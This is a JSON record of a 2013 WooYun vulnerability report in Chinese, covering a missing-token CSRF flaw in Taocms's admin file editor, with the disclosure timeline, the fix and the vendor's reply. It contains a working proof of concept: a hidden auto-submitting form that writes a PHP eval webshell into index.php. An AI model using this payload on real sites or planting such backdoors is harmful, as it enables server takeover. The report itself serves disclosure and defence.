{"id": 9827, "wybug_id": "wooyun-2013-032370", "wybug_title": "Taocms无token导致Csrf-getshell", "wybug_corp": "taocms开源", "wybug_author": "VIP", "wybug_date": "2013-07-26 11:13", "wybug_open_date": "2013-09-09 11:14", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-09：\t细节向公众公开  简要描述： 无token，所以可以通过交互管理员进行Csrf-getshell，全程只需要管理员点击一个网页，不知不觉getshell就自动完成了。 详细说明：  后台有编辑文件功能，可以编辑php文件，植入一句话。且此功能无token限制，导致可以通过一个Csrf交互来getshell.POC如下(如运行不正常，为乌云编辑器所致，将中间的空行删去即可）：\n代表乌云消灭你<form action=\"http://127.0.0.1/admin/admin.php\" method=\"POST\" target=\"hidden_frame\"><input type=\"hidden\" name=\"filedata\" value=\"<?php@eval($_REQUEST['wooyun']);include('config.php');include(SYS_ROOT.INC.'common.php');$path=$_SERVER['PATH_INFO'].($_SERVER['QUERY_STRING']?'?'.str_replace('?','',$_SERVER['QUERY_STRING']):'');if(substr($path, 0,1)=='/'){$path=substr($path,1);}$ctrl=isset($_GET['action'])?$_GET['action']:'run';if(isset($_GET['createprocess'])){Index::createhtml(isset($_GET['id'])?$_GET['id']:0,$_GET['cat'],$_GET['single']);}else{Index::$ctrl($path);}?>\" /><input type=\"hidden\" name=\"input\" value=\"index.php\" /><input type=\"hidden\" name=\"name\" value=\"index.php\" /><input type=\"hidden\" name=\"action\" value=\"file\" /><input type=\"hidden\" name=\"ctrl\" value=\"save\" /><input type=\"hidden\" name=\"path\" value=\"index.php\" /></form><iframe style=\"DISPLAY: none\" id=hidden_frame name=hidden_frame></iframe><script>document.forms[0].submit();</script>\n   漏洞证明：  页面上只是一段简单的文字，但是其实后台已经发起了一次POST请求，在index.php中植入了一句话木马。\n\n\n\n\n\n   修复方案：  后台增加token验证   版权声明：转载请注明来源 VIP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-07-26 14:12 厂商回复： 十分感谢，本周将发布修复版本 最新状态： 2013-07-26：已经修复此bug，感谢  ", "replys": "漏洞评价：\n评论\n     2013-07-26 11:17 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  屌爆了，日五晚俺软    \n     2013-07-26 11:19 |    \t\tnauscript \t\t\t( 普通白帽子  |\t\t\t        Rank:291 漏洞数:57        | 我淫荡啊我淫荡)\t\t \n  好高端的样子    \n     2013-07-26 11:55 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}